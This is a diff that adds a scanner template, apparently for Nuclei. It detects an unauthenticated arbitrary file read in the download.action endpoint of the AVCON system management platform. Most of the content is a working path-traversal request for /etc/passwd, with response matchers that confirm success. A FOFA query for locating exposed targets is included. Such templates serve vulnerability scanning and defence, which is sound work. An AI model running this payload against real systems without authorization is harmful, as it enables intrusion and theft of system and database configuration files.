@@ -1,0 +1,29 @@
+http:
+    - matchers:
+        - condition: and
+          part: body
+          type: word
+          words:
+            - root:x
+            - /bin/bash
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          GET /download.action?filename=../../../../../../../../etc/passwd HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
+id: AVCON-download_action-File-reading
+info:
+    author: Superhero
+    description: |-
+        fofa: title="AVCON-系统管理平台"
+        AVCON-系统管理平台 download.action 存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。
+    name: AVCON-系统管理平台 download.action 任意文件读取漏洞
+    reference:
+        - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247486711&idx=1&sn=34e4c799279bf0673136bff2221ac65b&chksm=c267b9c4f51030d2a297bca65a7faec2cd8e4fe7bc6d009852fcadb8f41219672e21a300d9fa&token=522460222&lang=zh_CN#rd
+    severity: high
+    tags:
+        - File reading
